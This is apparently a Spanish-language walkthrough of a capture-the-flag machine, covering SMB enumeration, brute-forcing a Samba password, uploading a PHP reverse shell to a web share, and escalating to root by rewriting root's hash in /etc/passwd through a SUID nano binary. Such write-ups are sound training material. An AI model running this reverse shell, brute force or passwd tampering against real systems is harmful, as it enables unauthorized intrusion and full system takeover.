## Reconocimiento:

Puertos:

80 : http

139, 445 : Samba

```bash
enum4linux  -a IP
```

Y encontramos 2 usuarios (bob y james) junto  a un sharename html.

Aplicando FB a los usuarios encontramos las credenciales de bob:

```bash
crackmapexec smb IP -u users.txt -p DICCIONARIO —shares
```

Samba Passwd: star

Dentro del samba vemos que se esta alojando la web, quitamos el archivo y ponemos una shell:

```bash
nano shell.php

#Dentro del nano
<?php
$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

Nos ponemos a la escucha y en la web ponemos:

```bash
URL = http://<IP>/shell.php
```

## Escalada www-data → root

Intente con un sudo -l y nada, decido listar permisos SUID

```bash
find / -perm -4000 2>/dev/null
```

Encontramos el binario /usr/bin/nano

Desde el host codificamos un password para root

```bash
openssl passwd -6 1234
```

Editamos el archivo /etc/passwd ya que tenemos nano habilitado como root:

```bash
nano /etc/passwd

#Dentro del nano
# Linea antigua root:x:0:0:root:/root:/bin/bash
root:$6$D5Pf8XtUztx3knXj$15lTMFZhwpOz/wuEdiEByjDNKbHzE/ogsRBX2CTEOyZxpLUVMiFM6.7bzcxxVHIkjEu5D7wzHpdFmcgZVyUHe0:0:0:root:/root:/bin/bash
```

Cambiar la x por la contraseña generada (tambien funciona dejando el espacio donde esta la x vacío).

```bash
su root
```

Listo.
